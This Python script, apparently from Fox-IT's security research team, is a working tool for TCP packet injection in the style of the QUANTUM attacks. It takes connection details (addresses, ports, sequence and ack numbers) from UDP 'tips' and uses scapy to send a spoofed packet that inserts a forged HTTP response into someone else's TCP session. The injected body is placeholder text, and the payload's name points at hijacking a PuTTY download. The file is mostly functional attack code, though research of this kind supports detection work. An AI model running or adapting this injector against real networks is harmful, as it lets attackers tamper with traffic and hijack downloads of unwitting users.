#!/usr/bin/env python
#
# file:     shooter.py
# author:   Fox-IT Security Research Team <srt@fox-it.com>
#
# shooter.py, used to receive TCP seq+ack data and sending spoofed packet
#

# Python imports
from monitor import QuantumTip, TIP_LEN, TIP_STRUCT
from scapy.all import *
import sys
import struct
import socket
import argparse

# Scapy imports
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Local imports
PAYLOAD_PUTTY_BODY = 'hehehehhahahah'
PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 18:16:19 GMT\r\nContent-Type: text/html\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nETag: W/"60770091-208"\r\nContent-Encoding: gzip\r\n\r\n'
PAYLOAD_PUTTY = PAYLOAD_PUTTY_HEADER + PAYLOAD_PUTTY_BODY


class QI(object):
    def inject(self, src, dst, sport, dport, seq, ack):
        payload = PAYLOAD_PUTTY
        p = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport,
                                       seq=seq+1, ack=ack, flags="PA") / payload
        send(p)
        sendp(p, iface="eth0")
        print('Shooting: %r' % p)


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-l", "--listen", default="0.0.0.0",
                        help="listen on specified ip")
    parser.add_argument("-p", "--port", type=int, default=1111,
                        help="listen on specified (udp) port")

    args = parser.parse_args()

    qi = QI()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.listen, args.port))

    print('Shooter listening on %s:%u' % (args.listen, args.port))

    while True:
        data, addr = sock.recvfrom(1024)
        if len(data) == TIP_LEN:
            tip = QuantumTip._make(struct.unpack(TIP_STRUCT, data))
            print('Received tip from %r: %r' % (addr, tip))
            qi.inject(
                src=socket.inet_ntoa(struct.pack(">I", tip.src)),
                dst=socket.inet_ntoa(struct.pack(">I", tip.dst)),
                sport=tip.sport,
                dport=tip.dport,
                seq=tip.seq,
                ack=tip.ack,
            )


if __name__ == '__main__':
    sys.exit(main())
